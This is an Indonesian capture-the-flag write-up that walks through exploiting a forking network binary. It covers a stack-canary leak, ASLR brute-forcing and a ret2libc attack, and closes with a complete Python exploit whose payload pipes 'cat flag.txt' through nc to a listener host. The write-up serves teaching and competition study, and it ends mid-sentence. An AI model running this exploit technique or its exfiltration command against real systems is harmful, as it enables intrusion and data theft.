+|    0x08048938 <+237>:   mov    DWORD PTR [esp+0x4],eax
+|    0x0804893c <+241>:   mov    eax,DWORD PTR [ebp+0xc]
+|    0x0804893f <+244>:   mov    DWORD PTR [esp],eax
+|    0x08048942 <+247>:   call   0x80486d0 <send@plt>                 // mengirim pesan ke client
+|    0x08048947 <+252>:   mov    edx,DWORD PTR [ebp-0xc]
+|    0x0804894a <+255>:   xor    edx,DWORD PTR gs:0x14                // stack canary check
+|    0x08048951 <+262>:   je     0x8048958 <pinkyderp+269>
+|    0x08048953 <+264>:   call   0x80485c0 <__stack_chk_fail@plt>
+|    0x08048958 <+269>:   add    esp,0xd4
+|    0x0804895e <+275>:   pop    edi
+|    0x0804895f <+276>:   pop    ebp
+|    0x08048960 <+277>:   ret    
+| End of assembler dump.
+| gdb-peda$ 
++-------------------------------
+
+Hasil disassemble diatas, program akan mengirimkan pesan ke client "selamat
+datang derpsi!\n" dengan besar size 0x17. Kemudian program akan membaca input
+melalui fungsi recv dengan max 40bytes dan disimpan pada variable dengan besar
+48bytes. Melalui fungsi sprintf, program melakukan copy nilai input ke variable
+lainnya, kemudian mengirimkannya ke client mempergunakan write. 
+
+Pada akhir fungsi pinkyderp, program membaca input melalui recv dan akan
+mengirimkannya kembali ke client melalui fungsi send dan socket berakhir,
+karena di fungsi main setelah dipanggil-nya fungsi pinkyderp adalah close(). 
+
+-----| Exploitation
+
+Setelah melakukan reverse engineering terhadap binary, langkah selanjutnya
+adalah melakukan cek terhadap proteksi yang ada pada binary tersebut. Disini
+saya mempergunakan fitur checksec pada peda[4] yang memiliki kesamaan fungsi
+dengan checksec.sh [5].
+
++---------------------
+| gdb-peda$ checksec 
+| CANARY    : ENABLED
+| FORTIFY   : disabled
+| NX        : ENABLED
+| PIE       : disabled
+| RELRO     : Partial
+| gdb-peda$ 
++--------------------
+
+Informasi diatas, diketahui bahwa binary teaser2 memiliki 3 proteksi yaitu
+Stack Canary, NX, dan ASLR (sesuai info dari file readme pada challenge).  
+
+ASLR [6] (Address Space Layout Randomization) adalah proteksi dengan melakukan
+mengacak alamat pada memory, sehingga tehnik-tehnik exploitasi seperti jump to
+shellcode address akan lebih sulit untuk dilakukan karena address yang
+berubah-ubah setiap kali program restart. Berikut ini langkah untuk melakukan
+cek terhadap ASLR:
+
++-------------------
+| moo@vx101:~$ cat /proc/sys/kernel/randomize_va_space 
+| 2
+| moo@vx101:~$ 
++-------------------
+
+NX [7] (No Execute) adalah proteksi dengan melakukan Write ^ Execute (write xor
+execute) terhadap page memory, sehingga page hanya dapat dilakukan read, write
+saja atau read, execute saja. Proteksi ini dapat digunakan untuk mengatasi
+tehnik code injection atau jump to shellcode. 
+
++------------------
+| gdb-peda$ vmmap teaser2
+| Start      End        Perm  Name
+| 0x08048000 0x0804a000 r-xp  /home/haxx/teaser2
+| 0x0804a000 0x0804b000 r--p  /home/haxx/teaser2
+| 0x0804b000 0x0804c000 rw-p  /home/haxx/teaser2
+| gdb-peda$ 
++------------------
+
+Stack Canary [8] adalah proteksi buffer overflow dengan memasang random value
+pada setiap awal frame melalui hasil random generation yang tersimpan pada
+register gs. Pada akhir frame, dilakukan cek apakah nilai cookies masih sama
+atau tidak. Jika nilai tidak sama / overwriten, maka program akan melakukan
+terminate. Pembahasan tentang stack cookies dan cara membypass-nya sebelumnya
+telah dibahas oleh BrazilianSubZero [9] di ezine echo.   
+
+Untuk membuat exploit pada suatu target tentu kita harus tahu terlebih dahulu
+karakteristik target tersebut, misalnya sistem operasi apakah yang dijalankan,
+versi sistem operasi tersebut, dan kemungkinan lain, seperti proteksi apa saja
+yang kemungkinan dijalankan pada komputer target. 
+
+Information gathering terhadap server target yang menjalankan binary teaser2
+
++--------------------
+| bash-3.2$ nmap -p2222 -sV root.echo.or.id
+| 
+| Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-26 07:25 WIB
+| Nmap scan report for root.echo.or.id (103.11.74.46)
+| Host is up (0.050s latency).
+| rDNS record for 103.11.xx.46: ip-11-74-46.xxxxxxx.net
+| PORT     STATE SERVICE VERSION
+| 2222/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze4 (protocol 2.0)
+| Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+| 
+| Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+| Nmap done: 1 IP address (1 host up) scanned in 3.84 seconds
+| bash-3.2$  
++--------------------
+
+Dari hasil nmap diketahui komputer target menjalankan sistem operasi debian 6
+dan kemudian dari info file readme.txt pada situs ctf.echo.or.id, telah
+memberikan informasi bahwa sistem operasi target menerapkan ASLR sebagai
+proteksi keamananannya.
+
++------------snip---
+| 1. File "teaser2"
+| Download: http://ctf.echo.or.id/teaser2
+| Type: Exploitation
+| Launch Your Exploit: root.echo.or.id:31337
+| Point: 400
+| Info: with ASLR
++------------snip---
+
+Saya membuat environment os yang sama seperti hasil information gathering, dan
+mencobanya melakukan exploitasi secara lokal terlebih dahulu sebelum exploitasi
+secara remote pada server ctf echo. Untuk melakukan exploit development, saya
+mempergunakan peda untuk mempermudah ketika melakukan proses exploitasi.
+
+Untuk melakukan analisa apakah ada celah buffer overflow didalamnya, dapat
+dilakuan dengan membaca pengalokasian besar buffer yang ada, membaca adanya
+fungsi-fungsi yang berbahaya digunakan yang berpotensi buffer overflow, atau
+dapat dengan melakukan fuzzing. 
+
+Program teaser2 melakukan 4 kali recv(), untuk mengetahui adanya celah buffer
+overflow dengan tehnik fuzzing adalah dengan mengirimkan packet sampah pada
+setiap masing-masing input buffer-nya. Berikut kode yang dapat digunakan.
+
++--------------------------
+| #!/usr/bin/python
+| from socket import *
+|
+| def xor(key, plain):
+|     enc = []
+|     for x,y in enumerate(plain):
+|         enc.append(chr(ord(y) ^ ord(key[x % len(key)])))
+|     return "".join(enc)
+| 
+| def conn(auth, buf):
+|     s = socket(AF_INET, SOCK_STREAM)
+|     s.connect(('localhost', 31337))
+|     s.send(auth)
+|     print s.recv(1024)
+|     s.send(buf)
+|     pkt = s.recv(1024)
+|     print pkt
+|     s.send(buf)
+|     pkt = s.recv(1024)
+|     print pkt
+|     s.send(buf)
+|     pkt = s.recv(1024)
+|     print pkt
+| 
+| def main():
+|     auth = xor('hcknaked', 'rahasia.')
+|     buf = "\x41" * 150
+|     conn(auth, buf)
+|
+| if __name__ == "__main__":
+|     main()
++------------------------------
+
+Dan baaab00m.. program mengalami crash dimana canary ter overwrite dengan nilai
+"A", sehingga program mendeteksi adanya buffer overflow, dan melakukan
+terminasi process.
+
++--------------------------
+| gdb-peda$ r
+| [New process 19124]
+| *** stack smashing detected ***: /home/haxx/teaser2 terminated
+| ======= Backtrace: =========
+| /lib/i386-linux-gnu/i686/cmov/libc.so.6(__fortify_fail+0x50)[0xb7f61980]
+| /lib/i386-linux-gnu/i686/cmov/libc.so.6(+0xeb92a)[0xb7f6192a]
+| /home/haxx/teaser2[0x8048958]
+| [0x41414141]
+| ======= Memory map: ========
+| 08048000-0804a000 r-xp 00000000 08:01 816993     /home/haxx/teaser2
+| 0804a000-0804b000 r--p 00001000 08:01 816993     /home/haxx/teaser2
+| 0804b000-0804c000 rw-p 00002000 08:01 816993     /home/haxx/teaser2
+| 0804c000-0806d000 rw-p 00000000 00:00 0          [heap]
+| b7e58000-b7e74000 r-xp 00000000 08:01 889582     /lib/i386-linux-gnu/libgcc_s.so.1
+| b7e74000-b7e75000 rw-p 0001b000 08:01 889582     /lib/i386-linux-gnu/libgcc_s.so.1
+| b7e75000-b7e76000 rw-p 00000000 00:00 0 
+| b7e76000-b7fd3000 r-xp 00000000 08:01 889556     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| b7fd3000-b7fd4000 ---p 0015d000 08:01 889556     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| b7fd4000-b7fd6000 r--p 0015d000 08:01 889556     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| b7fd6000-b7fd7000 rw-p 0015f000 08:01 889556     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| b7fd7000-b7fda000 rw-p 00000000 00:00 0 
+| b7fdf000-b7fe1000 rw-p 00000000 00:00 0 
+| b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
+| b7fe2000-b7ffe000 r-xp 00000000 08:01 889465     /lib/i386-linux-gnu/ld-2.13.so
+| b7ffe000-b7fff000 r--p 0001b000 08:01 889465     /lib/i386-linux-gnu/ld-2.13.so
+| b7fff000-b8000000 rw-p 0001c000 08:01 889465     /lib/i386-linux-gnu/ld-2.13.so
+| bffeb000-c0000000 rw-p 00000000 00:00 0          [stack]
+|
+| Program received signal SIGABRT, Aborted.
+| [Switching to process 19124]
++-------------------------
+
+output program python:
+
++-------------------------
+| haxx@debianlabs:~$ python xpl.py 
+| tekan enter untuk masuk ke halaman priv8!
+| 
+| selamat datang derpsi!
+|
+| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?Y??????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?Y????????????
++-------------------------
+
+Terlihat beberapa karakter yang tidak sesuai dengan buffer yang kita kirimkan,
+jika output tersebut dirubah menjadi hex, hasilnya sebagai berikut:
+
+204141414141414141414141414141414141414141414141414141414141414141414141414141
+4141c059ffb7d8f7ffbf0041414141414141414141414141414141414141414141414141414141
+41414141414141414141c059ffb7d8f7ffbf0078994708000000a9f3ffbf
+
+Terlihat seperti sebuah alamat yang tersimpan didalam stack dan tidak ter
+overwrite oleh buffer, alamat tersebut merupakan information leak yang dapat
+digunakan untuk melakukan kalkulasi alamat yang dapat digunakan untuk melakukan
+jump to shellcode. Meskipun terdapat leak address namun trik jump to shellcode
+tidak dapat dilakukan karena terdapat proteksi NX pada binary teaser2.
+
+Disini kita sudah tahu bahwa binary teaser2 memiliki celah information leak dan
+buffer overflow. Untuk mengetahui dimana letak information leak dan dimana
+buffer overflow, kita dapat mengubah nilai buffer kedua, ketiga dan keempat
+menjadi 'A', 'B', dan 'C' untuk membedakan antara ketiganya.
+
++--------------------------
+| gdb-peda$ r
+| *** stack smashing detected ***: /home/haxx/teaser2 terminated
+| ======= Backtrace: =========
+| /lib/i386-linux-gnu/i686/cmov/libc.so.6(__fortify_fail+0x50)[0xb7f61980]
+| /lib/i386-linux-gnu/i686/cmov/libc.so.6(+0xeb92a)[0xb7f6192a]
+| /home/haxx/teaser2[0x8048958]
+| [0x43434343]
+| ======= Memory map: ========
+| 08048000-0804a000 r-xp 00000000 08:01 816993     /home/haxx/teaser2
+| 0804a000-0804b000 r--p 00001000 08:01 816993     /home/haxx/teaser2
+| 0804b000-0804c000 rw-p 00002000 08:01 816993     /home/haxx/teaser2
+| 0804c000-0806d000 rw-p 00000000 00:00 0          [heap]
+| b7e58000-b7e74000 r-xp 00000000 08:01 889582     /lib/i386-linux-gnu/libgcc_s.so.1
+| b7e74000-b7e75000 rw-p 0001b000 08:01 889582     /lib/i386-linux-gnu/libgcc_s.so.1
+| b7e75000-b7e76000 rw-p 00000000 00:00 0 
+| b7e76000-b7fd3000 r-xp 00000000 08:01 889556     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| b7fd3000-b7fd4000 ---p 0015d000 08:01 889556     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| b7fd4000-b7fd6000 r--p 0015d000 08:01 889556     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| b7fd6000-b7fd7000 rw-p 0015f000 08:01 889556     /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| b7fd7000-b7fda000 rw-p 00000000 00:00 0 
+| b7fdf000-b7fe1000 rw-p 00000000 00:00 0 
+| b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
+| b7fe2000-b7ffe000 r-xp 00000000 08:01 889465     /lib/i386-linux-gnu/ld-2.13.so
+| b7ffe000-b7fff000 r--p 0001b000 08:01 889465     /lib/i386-linux-gnu/ld-2.13.so
+| b7fff000-b8000000 rw-p 0001c000 08:01 889465     /lib/i386-linux-gnu/ld-2.13.so
+| bffeb000-c0000000 rw-p 00000000 00:00 0          [stack]
+| 
+| Program received signal SIGABRT, Aborted.
++-------------------------
+
+python output:
+--snip--
+2041414141414141414141414141414141414141414141414141414141414141414141414141
+414141c059ffb7d8f7ffbf004141414141414141414141414141414141414141414141414141
+414141414141414141414141c059ffb7d8f7ffbf0041e13408000000a9f3ffbf
+--snip--
+
+Dari informasi tersebut, celah information leak ada pada buffer ketiga dan
+buffer overflow pada buffer keempat.
+
+Ada banyak trik yang dapat dilakukan untuk melakukan exploitasi pada program
+binary dengan proteksi NX, Canary, dan ASLR. Tentu saja semua proteksi tersebut
+dapat dilewati dengan lebih mudah jika terdapat celah information leak juga
+dalam program tersebut. Untuk melakukan exploitasi binary ini saya
+mempergunakan trik ret2libc [10] untuk melakukan melewati proteksi NX. Atau mau
+mencoba 'try harder' dengan ROP (Return Oriented Programming) [11] untuk
+melakukan leak address libc yang random karena ASLR? :)
+
+Seperti yang telah dibahas sebelumnya, challenge teaser2 melakukan fork
+terhadap setiap koneksi dari client. Hal ini menyebabkan proses randomisasi
+hanya dilakukan sekali ketika program berjalan sehingga nilai dari canary tidak
+berubah meskipun child mengalami crash dan ASLR tidak melakukan randomisasi
+address kembali ketika mengalami crash pada child-nya [12].
+
+Karena adanya stack canary, untuk dapat melakukan overwrite terhadap return
+address kita dapat mencoba memanfaatkan information leak untuk mengirimkan
+informasi canary yang tersimpan pada alamat ebp-0xc. Pada fungsi pinkyderp
+lakukan break pada address ketika register gs  menyimpan nilai cookies ke
+ebp-0xc, dan nilai canary akan berada pada register eax.
+
++------snip--
+|    0x0804884b <+0>: push   ebp
+|    0x0804884c <+1>: mov    ebp,esp
+|    0x0804884e <+3>: push   edi
+|    0x0804884f <+4>: sub    esp,0xd4
+|    0x08048855 <+10>:    mov    eax,DWORD PTR [ebp+0x8]
+|    0x08048858 <+13>:    mov    DWORD PTR [ebp-0xbc],eax
+|    0x0804885e <+19>:    mov    eax,gs:0x14
+|    0x08048864 <+25>:    mov    DWORD PTR [ebp-0xc],eax
+|    0x08048867 <+28>:    xor    eax,eax
++-----snip--
+
++-----------------------
+| gdb-peda$ r
+| [New process 19318]
+| [Switching to process 19318]
+| [----------------------------------registers-----------------------------------]
+| EAX: 0x96082600 
+| EBX: 0x8 
+| ECX: 0xbffff350 --> 0xbffff3a0 ('A' <repeats 108 times>)
+| EDX: 0x8 
+| ESI: 0x0 
+| EDI: 0xbffff3a9 ('A' <repeats 99 times>)
+| EBP: 0xbffff348 --> 0xbffff7d8 --> 0xbffff858 --> 0x0 
+| ESP: 0xbffff270 --> 0xb7f44f6e (<sbrk+14>:  add    ebx,0x91086)
+| EIP: 0x8048864 (<pinkyderp+25>: mov    DWORD PTR [ebp-0xc],eax)
+| EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+| [-------------------------------------code-------------------------------------]
+|   0x8048855 <pinkyderp+10>:    mov    eax,DWORD PTR [ebp+0x8]
+|   0x8048858 <pinkyderp+13>:    mov    DWORD PTR [ebp-0xbc],eax
+|   0x804885e <pinkyderp+19>:    mov    eax,gs:0x14
+| |=> 0x8048864 <pinkyderp+25>:    mov    DWORD PTR [ebp-0xc],eax
+|   0x8048867 <pinkyderp+28>:    xor    eax,eax
+|   0x8048869 <pinkyderp+30>:    mov    DWORD PTR [esp+0x8],0x17
+|   0x8048871 <pinkyderp+38>:    mov    DWORD PTR [esp+0x4],0x8048df0
+|   0x8048879 <pinkyderp+46>:    mov    eax,DWORD PTR [ebp+0xc]
+| [------------------------------------stack-------------------------------------]
+| 0000| 0xbffff270 --> 0xb7f44f6e (<sbrk+14>: add    ebx,0x91086)
+| 0004| 0xbffff274 --> 0x806d000 
+| 0008| 0xbffff278 --> 0xb7fd7d74 --> 0x806d000 
+| 0012| 0xbffff27c --> 0xb7fd5ff4 --> 0x15fd7c 
+| 0016| 0xbffff280 --> 0x0 
+| 0020| 0xbffff284 --> 0xbffff320 --> 0xb7e82ab4 --> 0x1388 
+| 0024| 0xbffff288 --> 0xbffff2d8 --> 0xb7e82ab4 --> 0x1388 
+| 0028| 0xbffff28c --> 0xbffff3a0 ('A' <repeats 108 times>)
+| [------------------------------------------------------------------------------]
+| Legend: code, data, rodata, value
+|
+| Breakpoint 1, 0x08048864 in pinkyderp ()
+| gdb-peda$ 
++------------------------
+
+Dari informasi tersebut nilai canary adalah 0x96082600, dimana nilai canary
+tersebut terdapat null terminator yang dapat mengakhiri buffer yang dikirimkan
+jika celah buffer overflow terdapat pada fungsi seperti strcpy, sprintf, dan
+lain-lain. Challenge teaser2 menggunakan fitur sprintf untuk melakukan copy
+pada input buffer ketiga. Pada kasus teaser2 ketika dicoba dengan buffer yang
+lebih besar, input pada buffer ketiga dapat pula digunakan untuk melakukan
+overwrite terhadap stack canary, namun karena diproses oleh sprintf maka hal
+ini tidak memungkinkan untuk dapat melakukan overwrite hingga return address.
+
+stack tanpa stack canary
++---------------------------------------------------------------+
+|                buffer              |   ebp   | return address |
++---------------------------------------------------------------+
+
+stack dengan stack canary
++---------------------------------------------------------------+
+|       buffer     | canary | buffer |   ebp   | return address |   
++---------------------------------------------------------------+
+
+Berikut ini adalah potongan kode yang digunakan untuk melakukan leak terhadap
+stack canary.
+
++---------------------------
+| #!/usr/bin/python
+| from socket import *
+| from binascii import hexlify as hx
+| 
+| def xor(key, plain):
+|     enc = []
+|     for x,y in enumerate(plain):
+|         enc.append(chr(ord(y) ^ ord(key[x % len(key)])))
+|     return "".join(enc)
+| 
+| def conn(auth, buf):
+|     s = socket(AF_INET, SOCK_STREAM)
+|     s.connect(('localhost', 31337))
+|     s.send(auth)
+|     print s.recv(1024)
+|     s.send(buf)
+|     pkt = s.recv(1024)
+|     print pkt
+|     s.send(buf[:40])
+|     pkt = s.recv(1024)
+|     print hx(pkt)
+|     buf = "C" * 150
+|     s.send(buf)
+|
+| def main():
+|     auth = xor('hcknaked', 'rahasia.')
+|     buf = "\x41" * 100
+|     conn(auth, buf)
+| 
+| if __name__ == "__main__":
+|     main()
++----------------------------
+
+Pada fungsi pinkyderp, lakukan break pada address 0x0804894a untuk melihat
+nilai canary sebelum instruksi xor. 
+
++--snip--
+|    0x0804893f <+244>:   mov    DWORD PTR [esp],eax
+|    0x08048942 <+247>:   call   0x80486d0 <send@plt>
+|    0x08048947 <+252>:   mov    edx,DWORD PTR [ebp-0xc]
+|    0x0804894a <+255>:   xor    edx,DWORD PTR gs:0x14
+|    0x08048951 <+262>:   je     0x8048958 <pinkyderp+269>
+|    0x08048953 <+264>:   call   0x80485c0 <__stack_chk_fail@plt>
+|    0x08048958 <+269>:   add    esp,0xd4
+|    0x0804895e <+275>:   pop    edi
+|    0x0804895f <+276>:   pop    ebp
+|    0x08048960 <+277>:   ret  
++--snip--
+
++---------------------------
+| [----------------------------------registers-----------------------------------]
+| EAX: 0xc8 
+| EBX: 0x8 
+| ECX: 0xbffff270 --> 0x8 
+| EDX: 0xefb88600 
+| ESI: 0x0 
+| EDI: 0xbffff405 --> 0x0 
+| EBP: 0xbffff348 --> 0xbffff7d8 --> 0xbffff858 --> 0x0 
+| ESP: 0xbffff270 --> 0x8 
+| EIP: 0x804894a (<pinkyderp+255>:    xor    edx,DWORD PTR gs:0x14)
+| EFLAGS: 0x200203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
+|[-------------------------------------code-------------------------------------]
++----------------------------
+
+output program python:
+
+--snip--
+204141414141414141414141414141414141414141414141414141414141414141414141414141
+4141c059ffb7d8f7ffbf0041414141414141414141414141414141414141414141414141414141
+41414141414141414141c059ffb7d8f7ffbf0086b8ef
+--snip--
+
+Pada 4bytes terakhir dari information leak yang didapat adalah nilai yang sama
+dengan canary yang tersimpan didalam register edx, dan 4 bytes sebelum canary
+merupakan informasi stack yang dapat dimanfaatkan untuk mencari lokasi buffer
+yang dikirimkan. Selanjutnya adalah mencari offset buffer keempat hingga
+melakuan overwrite terhadap stack canary dan return address.
+
++--------------------------
+| gdb-peda$ pattern_create 220
+| 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAA
+| eAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAAS
+| AAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$'
+| gdb-peda$ set follow-fork-mode child 
+| gdb-peda$ run
++--------------------------
+
+kemudian kita modifikasi buffer yang akan dikirimkan pada exploit.
++-------------------snip--
+| def conn(auth, buf):
+|     s = socket(AF_INET, SOCK_STREAM)
+|     s.connect(('localhost', 31337))
+|     s.send(auth)
+|     print s.recv(1024)
+|     s.send(buf)
+|     pkt = s.recv(1024)
+|     print pkt
+|     s.send(buf[:40])
+|     pkt = s.recv(1024)
+|     print hx(pkt)
+|     buf = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA
+|            3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQ
+|            AAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA
+|            %%A%sA%BA%$'
+|    s.send(buf)
++--------------------snip--
+
+Lakukan break pada 0x0804894a untuk melihat value stack canary yang ter
+overwrite oleh pattern hasil generate mempergunakan peda.
+
++-------------------------
+| [----------------------------------registers-----------------------------------]
+| EAX: 0xffffffff 
+| EBX: 0x8 
+| ECX: 0xffffffc8 
+| EDX: 0x41554141 ('AAUA')
+| ESI: 0x0 
+| EDI: 0xbffff405 --> 0x0 
+| EBP: 0xbffff348 ("AAWAAsAAXAAtAAYAAuAAZAAvAAwA\023")
+| ESP: 0xbffff270 ("AAYA\234\362\377\277\310")
+| EIP: 0x804894a (<pinkyderp+255>:    xor    edx,DWORD PTR gs:0x14)
+| EFLAGS: 0x200286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+| [-------------------------------------code-------------------------------------]
++------------------------
+
+Nilai canary teroverwrite dengan nilai 0x41554141, dimana setelah 160 bytes
+buffer canary akan ter overwrite.
+
++--------------------
+| gdb-peda$ pattern_offset 0x41554141
+| 1096106305 found at offset: 160
+| gdb-peda$
++---------------------
+
+Berikut ini gambaran ret2libc untuk melakukan exploitasi pada challenge
+teaser2.
+
++-----------------------------------------------------------------+
+|       buffer      | canary | buffer |    ebp    |      ret      |
++-----------------------------------------------------------------+
+
+                              8bytes      4bytes                    4bytes
++------------------------------------------------------------------------------------------+
+| perintah | buffer | canary | buffer |    ebp    |  system@libc  | padding | ptr_perintah |
++------------------------------------------------------------------------------------------+
+     ^                                                                              |
+     +------------------------------------------------------------------------------+
+
+Untuk melakukan exploitasi dengan ret2libc, perlu diketahui terlebih dahulu
+alamat dari system@libc. Karena saat ini proses exploitasi masih secara lokal
+maka lokasi alamat system@libc dapat diketahui dengan mudah selain itu kita
+dapat mematikan ASLR terlebih dahulu untuk memastikan bahwa exploit sukses.
+
++-------------------------
+| gdb-peda$ p system
+| $1 = {<text variable, no debug info>} 0xb7eb1f10 <system>
+| gdb-peda$ 
++------------------------
+
+Melalui celah information leak yang telah disinggung sebelumnya, dengan
+melakukan kalkulasi kita dapat menemukan informasi address dari buffer perintah
+dengan cara menghitung sebagai berikut:
+
+    offset = leaked_address - ebp - panjang buffer hingga ebp. 
+
+Pasang break pada instruksi "pop ebp" sebelum return address fungsi 'pinkyderp'
+untuk melihat nilai ebp sebelum ter-overwrite oleh buffer yang dikirimkan.
+
+output kode python:
+cookie    : '\x00\xc6\xd6\x68'
+leak_addr : bffff7d8
+
++-------------------------
+| gdb-peda$ run                  
+| [New process 19678]
+| [Switching to process 19678]
+| [----------------------------------registers-----------------------------------]
+| EAX: 0xffffffff 
+| EBX: 0x8 
+| ECX: 0xffffffc8 
+| EDX: 0x0 
+| ESI: 0x0 
+| EDI: 0x42424242 ('BBBB')
+| EBP: 0xbffff348 ("BBBB\020\037\353\267BBBBAAAAd")
+| ESP: 0xbffff348 ("BBBB\020\037\353\267BBBBAAAAd")
+| EIP: 0x804895f (<pinkyderp+276>:    pop    ebp)
+| EFLAGS: 0x200286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+| [-------------------------------------code-------------------------------------]
+|    0x8048953 <pinkyderp+264>:   call   0x80485c0 <__stack_chk_fail@plt>
+|    0x8048958 <pinkyderp+269>:   add    esp,0xd4
+|    0x804895e <pinkyderp+275>:   pop    edi
+| => 0x804895f <pinkyderp+276>:   pop    ebp
+|    0x8048960 <pinkyderp+277>:   ret    
+|    0x8048961 <pinkywinki>:  push   ebp
+|    0x8048962 <pinkywinki+1>:    mov    ebp,esp
+|    0x8048964 <pinkywinki+3>:    push   edi
+| [------------------------------------stack-------------------------------------]
+| 0000| 0xbffff348 ("BBBB\020\037\353\267BBBBAAAAd")
+| 0004| 0xbffff34c --> 0xb7eb1f10 (<system>:  sub    esp,0xc)
+| 0008| 0xbffff350 ("BBBBAAAAd")
+| 0012| 0xbffff354 ("AAAAd")
+| 0016| 0xbffff358 --> 0x64 ('d')
+| 0020| 0xbffff35c --> 0x0 
+| 0024| 0xbffff360 --> 0x804c008 ("rahasia.")
+| 0028| 0xbffff364 --> 0x13 
+| [------------------------------------------------------------------------------]
+| Legend: code, data, rodata, value
+| 
+| Breakpoint 1, 0x0804895f in pinkyderp ()
+| gdb-peda$ distance 0xbffff7d8 0xbffff348
+| From 0xbffff7d8 to 0xbffff348: -1168 bytes, -292 dwords
+| gdb-peda$ 
++-------------------------
+
+Dari hasil distance mempergunakan peda terhitung lokasi ebp berjarang -1168
+bytes, sedangkan nilai buffer sebelum ebp adalah 172 ( buffer + cookie + 8bytes
+padding).
+
+    alamat_perintah = 0xbffff7d8-1168-172
+    alamat_perintah = 0xbffff29c
+
++-----------------------------------------------------------------------------------------+
+| perintah | buffer | canary |  buffer |    ebp    |  system@libc | buffer | ptr_perintah |
++-----------------------------------------------------------------------------------------+
+
++-----------------------------------------------------------------------------------------+
+| perintah | buffer | canary | "A" * 8 |   "BBBB"  |  0xb7eb1f10  | "AAAA" |  0xbffff29c  |
++-----------------------------------------------------------------------------------------+
+     ^                                                                             |
+     +-----------------------------------------------------------------------------+
+
+
+Untuk melakukan exploitasi secara remote dibutuhkan bruteforce untuk menebak
+alamat system pada libc. 
+
++----------------------------
+| gdb-peda$ vmmap libc
+| Start      End        Perm  Name
+| 0xb7e76000 0xb7fd3000 r-xp  /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| 0xb7fd3000 0xb7fd4000 ---p  /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| 0xb7fd4000 0xb7fd6000 r--p  /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| 0xb7fd6000 0xb7fd7000 rw-p  /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+| gdb-peda$ p system
+| $1 = {<text variable, no debug info>} 0xb7eb1f10 <system>
+| gdb-peda$ distance 0xb7e76000 0xb7eb1f10
+| From 0xb7e76000 to 0xb7eb1f10: 245520 bytes, 61380 dwords
+| gdb-peda$
++---------------------------
+ 
+offset = system - base_address
+offset = 0xb7eb1f10 - 0xb7e76000 
+offset = 245520
+
+Nilai base address libc selalu berubah-ubah setiap kali program dijalankan
+karena adanya ASLR, namun perubahan tersebut masih mudah untuk ditebak karena
+masih dalam range kelipatan 0x1000 dalam setiap kali dilakukan randomisasi.
+
+Berikut ini adalah kode yang digunakan untuk memecahkan challenge teaser2.
+
++--------------------------
+| #!/usr/bin/python
+| from socket import *
+| from struct import pack
+| from binascii import hexlify as hx
+| from time import sleep
+| 
+| def xor(key, plain):
+|     enc = []
+|     for x,y in enumerate(plain):
+|         enc.append(chr(ord(y) ^ ord(key[x % len(key)])))
+|     return "".join(enc)
+| 
+| def conn(auth, buf, system):
+|     s = socket(AF_INET, SOCK_STREAM)
+|     s.connect(('root.echo.or.id', 31337))
+|     s.send(auth)
+|     print s.recv(1024)
+|     s.send(buf)
+|     print s.recv(1024)
+|     s.send(buf[:40])
+|     pkt = s.recv(1024)
+|     cookie = pkt[96:100]
+|     addr_leak = int("0x" + hx(pkt[92:96][::-1]), 0)
+|     cmd_addr = addr_leak-1168-168
+|     cmd = "sh  (ls;pwd;cat flag.txt) | nc 103.11.74.46 1111;\x00"
+|     payload = cmd + "\x41" * (160-len(cmd)) + cookie + "ECHOTEASER14" + pack("<I", system) + "AAAA" + pack("<I", cmd_addr)
+|     s.send(payload)
+| 
+| def main():
+|     auth = xor('hcknaked', 'rahasia.')
+|     buf = "\x41" * 100
+|     # 0xb7eb1f10
+|     for base in range(0xb7500000, 0xb78ff000, 0x1000):
+|         system = base + 245520
+|         conn(auth, buf, system)
+|         print hex(system)
+|         sleep(0.2)
+|
+| if __name__ == "__main__":
+|     main()
++---------------------------- 
+
++---------------------------
+| moo@vx101:~$ nc -lvvp 1111
+| listening on [any] 1111 ...
+| 103.11.74.46: inverse host lookup failed: Host name lookup failure
+| connect to [103.11.74.46] from (UNKNOWN) [103.11.74.46]
+| flag.txt
+| teaser2
+| /home/level1
+| kalo_kamu_bisa_baca_ini_kirim_email_ke_ctf_at_echo.or.id_isi_flag_ini
++---------------------------
+
+-----| Penutup
+
+Melihat antusias pemain yang 'sedikit', bisa disimpulkan hal ini dikarenakan
+hadiah yang tidak menggiurkan, challenge yang diberikan telihat 'susah?' ("guys
